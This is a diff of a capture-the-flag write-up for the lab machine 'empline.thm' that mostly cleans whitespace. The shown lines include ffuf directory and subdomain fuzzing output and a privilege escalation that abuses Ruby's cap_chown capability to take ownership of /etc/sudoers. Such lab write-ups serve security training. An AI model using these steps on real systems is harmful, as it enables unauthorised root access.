@@ -9,9 +9,9 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
-| 3306 | MYSQL   |
+| 22 | SSH |
+| 80 | HTTP |
+| 3306 | MYSQL |
 
 
 
@@ -32,32 +32,32 @@ Nothing weird on the main page, source code is normal too, let's proceed to fuzz
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://empline.thm/FUZZ" -ic -c -t 200 -e .php,.html,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://empline.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .git
+ :: Method : GET
+ :: URL : http://empline.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 155ms]
-index.html              [Status: 200, Size: 14058, Words: 5495, Lines: 288, Duration: 155ms]
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 156ms]
-assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 155ms]
-javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
+.html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 155ms]
+index.html [Status: 200, Size: 14058, Words: 5495, Lines: 288, Duration: 155ms]
+.php [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 156ms]
+assets [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 155ms]
+javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
 ```
 
 Nothing too interesting, let's fuzz subdomains then:
@@ -66,34 +66,34 @@ Nothing too interesting, let's fuzz subdomains then:
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.246.235 -H "Host: FUZZ.empline.thm" -mc 200,301,302 -fs 14058 -t 100 -ic -c
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.246.235
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.empline.thm
+ :: Method : GET
+ :: URL : http://10.10.246.235
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header : Host: FUZZ.empline.thm
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Response status: 200,301,302
- :: Filter           : Response size: 14058
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 100
+ :: Matcher : Response status: 200,301,302
+ :: Filter : Response size: 14058
 ________________________________________________
 
-job                     [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 181ms]
-www.job                 [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 175ms]
+job [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 181ms]
+www.job [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 175ms]
 ```
 
 
-We can add  to `/etc/hosts` and check them out:
+We can add to `/etc/hosts` and check them out:
 
 ![Pasted image 20250430154133.png](../../IMAGES/Pasted%20image%2020250430154133.png)
 
@@ -106,50 +106,50 @@ I tried these credentials but they didn't work, let's fuzz this subdomain to che
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://job.empline.thm/FUZZ" -ic -c -t 200 -e .php,.html,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://job.empline.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .git
+ :: Method : GET
+ :: URL : http://job.empline.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 160ms]
-images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 161ms]
-.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 161ms]
-index.php               [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 171ms]
-xml                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 155ms]
-modules                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 164ms]
-careers                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
-scripts                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
-upload                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 172ms]
-rss                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 7913ms]
-ajax                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 155ms]
-ajax.php                [Status: 200, Size: 140, Words: 13, Lines: 6, Duration: 159ms]
-test                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 155ms]
-lib                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 156ms]
-src                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 155ms]
-db                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 154ms]
-js                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
-javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 155ms]
-temp                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 156ms]
-vendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 159ms]
-config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 155ms]
-attachments             [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 154ms]
-ci                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 155ms]
+.html [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 160ms]
+images [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 161ms]
+.php [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 161ms]
+index.php [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 171ms]
+xml [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 155ms]
+modules [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 164ms]
+careers [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
+scripts [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
+upload [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 172ms]
+rss [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 7913ms]
+ajax [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 155ms]
+ajax.php [Status: 200, Size: 140, Words: 13, Lines: 6, Duration: 159ms]
+test [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 155ms]
+lib [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 156ms]
+src [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 155ms]
+db [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 154ms]
+js [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
+javascript [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 155ms]
+temp [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 156ms]
+vendor [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 159ms]
+config.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 155ms]
+attachments [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 154ms]
+ci [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 155ms]
 ```
 
 Well there's a lot of stuff we can check, let's do it:
@@ -334,9 +334,9 @@ Let's use linpeas to check any PE vector:
 
 `Ruby` has the `cap_chown` capability set, we can do the following:
 
-1. Create a Ruby Script to Change Ownership ofÂ `/etc/sudoers`
+1. Create a Ruby Script to Change Ownership of`/etc/sudoers`
 
-Create a file namedÂ `exploit.rb`Â with the following content:
+Create a file named`exploit.rb` with the following content:
 
 ```rb
 File.chown(Process.uid, Process.gid, "/etc/sudoers")
@@ -348,7 +348,7 @@ File.chown(Process.uid, Process.gid, "/etc/sudoers")
 /usr/local/bin/ruby exploit.rb
 ```
 
-3. ModifyÂ `/etc/sudoers`: 
+3. Modify`/etc/sudoers`: 
 
 ```
 chmod 640 /etc/sudoers
